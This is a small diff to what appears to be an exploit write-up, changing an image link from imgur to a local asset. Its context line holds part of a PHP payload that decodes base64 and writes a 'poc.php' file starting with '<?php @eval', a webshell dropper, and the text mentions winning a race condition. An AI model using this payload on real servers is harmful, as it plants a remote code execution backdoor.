@@ -104,4 +104,4 @@ b"@<?php echo 'phpok';file_put_contents('poc.php',base64_decode('PD9waHAgQGV2YWw
 
 Here we use race condition to catch our data
 
-![](https://i.imgur.com/lGHYJm2.png)
+![img1](./assets/img1.png?raw=true)
